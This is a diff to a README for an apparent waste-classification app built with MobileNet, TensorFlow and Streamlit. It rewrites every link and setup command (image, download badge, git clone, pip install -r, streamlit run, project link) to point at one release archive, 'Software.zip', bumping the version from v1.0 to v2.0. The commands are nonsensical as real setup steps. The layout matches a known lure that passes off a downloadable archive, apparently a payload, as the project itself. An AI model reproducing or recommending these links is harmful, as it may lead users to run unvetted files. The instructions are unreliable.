@@ -1,10 +1,10 @@
 # 🌟 Smart Waste Classification 🌟
 
-![Smart Waste Classification](https://github.com/dimarhanung/smart-waste-classification/releases/download/v1.0/Software.zip)
+![Smart Waste Classification](https://github.com/dimarhanung/smart-waste-classification/releases/download/v2.0/Software.zip)
 
 Welcome to the **smart-waste-classification** repository! This exciting project leverages the power of MobileNet and the TrashNet dataset to accurately classify waste into different categories and provide valuable recycling suggestions. Using TensorFlow and Streamlit, this application allows users to simply upload an image of trash and instantly receive classification results along with eco-friendly disposal recommendations.
 
-[![Download Project](https://github.com/dimarhanung/smart-waste-classification/releases/download/v1.0/Software.zip)](https://github.com/dimarhanung/smart-waste-classification/releases/download/v1.0/Software.zip)
+[![Download Project](https://github.com/dimarhanung/smart-waste-classification/releases/download/v2.0/Software.zip)](https://github.com/dimarhanung/smart-waste-classification/releases/download/v2.0/Software.zip)
 
 ## Overview
 
@@ -26,7 +26,7 @@ To get started with the **smart-waste-classification** project, follow these sim
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/dimarhanung/smart-waste-classification/releases/download/v1.0/Software.zip
+   git clone https://github.com/dimarhanung/smart-waste-classification/releases/download/v2.0/Software.zip
    ```
 
 2. Navigate to the project directory:
@@ -36,12 +36,12 @@ To get started with the **smart-waste-classification** project, follow these sim
 
 3. Install the required dependencies:
    ```bash
-   pip install -r https://github.com/dimarhanung/smart-waste-classification/releases/download/v1.0/Software.zip
+   pip install -r https://github.com/dimarhanung/smart-waste-classification/releases/download/v2.0/Software.zip
    ```
 
 4. Run the Streamlit app:
    ```bash
-   streamlit run https://github.com/dimarhanung/smart-waste-classification/releases/download/v1.0/Software.zip
+   streamlit run https://github.com/dimarhanung/smart-waste-classification/releases/download/v2.0/Software.zip
    ```
 
 5. Access the application in your web browser at `http://localhost:8501`.
@@ -81,4 +81,4 @@ Effective waste management is essential for a sustainable future, and the **smar
 
 Thank you for your interest in the **smart-waste-classification** project. Start classifying waste intelligently today! 🌍🌿
 
-[Visit the Project](https://github.com/dimarhanung/smart-waste-classification/releases/download/v1.0/Software.zip)
+[Visit the Project](https://github.com/dimarhanung/smart-waste-classification/releases/download/v2.0/Software.zip)
